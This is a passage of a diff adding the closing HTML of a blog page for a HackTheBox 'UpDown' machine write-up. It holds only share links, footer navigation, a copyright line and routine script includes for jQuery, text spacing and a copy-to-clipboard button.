+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&title=HackTheBox - Machine - UpDown"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&title=HackTheBox - Machine - UpDown"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&name=HackTheBox - Machine - UpDown&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&t=HackTheBox - Machine - UpDown"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
